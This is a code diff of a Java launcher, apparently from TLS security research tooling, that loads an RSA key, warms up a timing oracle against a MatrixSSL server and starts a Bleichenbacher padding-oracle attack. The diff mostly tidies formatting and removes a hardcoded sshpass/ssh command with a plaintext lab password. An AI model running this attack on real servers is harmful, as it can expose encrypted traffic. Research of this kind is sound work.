@@ -27,26 +27,6 @@ import org.bouncycastle.jce.provider.BouncyCastleProvider;
 public final class Launcher {
 
     /**
-     * Command to be executed.
-     */
-    private static final String COMMAND = "sshpass -p password ssh "
-            + "chris@192.168.1.2 /opt/matrixssl/apps/client 127.0.0.1 4433 ";
-    
-    /**
-     * Path to the key store containing the target's key.
-     */
-    private static final String KEYSTORE_PATH = "matrix-key.jks";
-    /**
-     * Name of the SSL target's key.
-     */
-    private static final String KEY_NAME = "1";
-    /**
-     * Password for the key store and the key.
-     */
-    private static String PASSWORD = "password";
-    
-    
-    /**
      * VALID PKCS with valid PMS - 1024bit.
      */
     private static final byte[] PLAIN_VALID_PKCS = new byte[]{
@@ -82,24 +62,24 @@ public final class Launcher {
     };
 
     /**
-     * Static only ;-)
+     * Static only ;-).
      */
     private Launcher() {
-        
     }
-    
+
     /**
      * Load a key store.
+     *
      * @param keyStorePath Path to the key store.
      * @param keyStorePassword Password for key store.
      * @return Pre-loaded key store.
      * @throws KeyStoreException
      * @throws IOException
      * @throws NoSuchAlgorithmException
-     * @throws CertificateException 
+     * @throws CertificateException
      */
     private static KeyStore loadKeyStore(final String keyStorePath,
-            final char[] keyStorePassword) throws KeyStoreException, 
+            final char[] keyStorePassword) throws KeyStoreException,
             IOException, NoSuchAlgorithmException, CertificateException {
         KeyStore ks = KeyStore.getInstance("JKS");
         ks.load(new FileInputStream(keyStorePath), keyStorePassword);
@@ -114,26 +94,21 @@ public final class Launcher {
      * @throws Exception
      */
     public static void main(final String[] args) throws Exception {
-        // just for testing
-//        CommandLineWorkflowExecutor executor = 
-//                new CommandLineWorkflowExecutor(COMMAND);
-//        executor.executeClientWithPMS("IamBatman".getBytes());
-
         Properties properties = new Properties();
-        if(args == null || args.length == 0) {
+        if (args == null || args.length == 0) {
             properties.load(new FileInputStream("/opt/timing.properties"));
-        } else{
+        } else {
             properties.load(new FileInputStream(args[0]));
         }
-        
+
         // pre setup
         Security.addProvider(new BouncyCastleProvider());
-        
+
         String keyName = properties.getProperty("keyName");
         char[] keyPassword = properties.getProperty("password").toCharArray();
-        KeyStore keyStore = loadKeyStore(properties.getProperty("keyStorePath"), 
+        KeyStore keyStore = loadKeyStore(properties.getProperty("keyStorePath"),
                 keyPassword);
-        
+
         RSAPrivateKey privateKey =
                 (RSAPrivateKey) keyStore.getKey(keyName, keyPassword);
         keyStore.getCertificate(keyName).getPublicKey();
@@ -161,12 +136,13 @@ public final class Launcher {
         oracle.setInvalidPMS(encInvalidPMS);
         // Warmup SSL caches
         oracle.warmup();
-        
+
         // train oracle
         // oracle.trainOracle(encValidPMS, encInvalidPMS);
 
         // launch the attack
-        Bleichenbacher attack = new Bleichenbacher(encValidPMS.clone(), oracle, true);
+        Bleichenbacher attack = new Bleichenbacher(encValidPMS.clone(), oracle,
+                true);
         attack.attack();
     }
 }
